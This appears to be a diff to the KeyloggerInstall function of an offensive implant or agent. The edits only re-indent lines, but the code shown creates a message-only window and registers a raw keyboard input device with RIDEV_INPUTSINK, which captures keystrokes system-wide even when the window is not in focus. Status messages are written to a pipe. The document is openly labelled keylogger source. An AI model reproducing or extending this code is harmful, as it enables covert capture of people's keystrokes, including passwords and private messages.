@@ -58,7 +58,7 @@ auto DECLFN KeyloggerInstall(
 
 	teststr = "[+] Registered Window Class: \n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
-    
+
 	teststr = "[+] Creating Message-Only Window ...\n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
 
@@ -77,26 +77,26 @@ auto DECLFN KeyloggerInstall(
         return KeyloggerCleanup();
     }
 
-	teststr = "[+] Created Message-Only Window\n";
+    teststr = "[+] Created Message-Only Window\n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
 
     RAWINPUTDEVICE RawDevice = { 0 };
 
-    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;     // Generic Desktop Controls
-    RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
-    RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
-    RawDevice.hwndTarget  = WindowHandle;               // Our message-only window
+    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;  // Generic Desktop Controls
+    RawDevice.usUsage = HID_USAGE_GENERIC_KEYBOARD;  // Keyboard
+    RawDevice.dwFlags = RIDEV_INPUTSINK;             // Receive input even when not in focus
+    RawDevice.hwndTarget = WindowHandle;             // Our message-only window
 
     if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
     {
-		teststr = "[!] Failed to register Raw Input Device\n";
+        teststr = "[!] Failed to register Raw Input Device\n";
         SafePipeWrite(teststr, Str::LengthA(teststr));
 
         return KeyloggerCleanup();
     }
 
-	teststr = "[+] Registered Raw Input Device\n";
-	SafePipeWrite(teststr, Str::LengthA(teststr));
+    teststr = "[+] Registered Raw Input Device\n";
+    SafePipeWrite(teststr, Str::LengthA(teststr));
 
     teststr = "[+] Entering message loop...\n";
     SafePipeWrite(teststr, Str::LengthA(teststr));
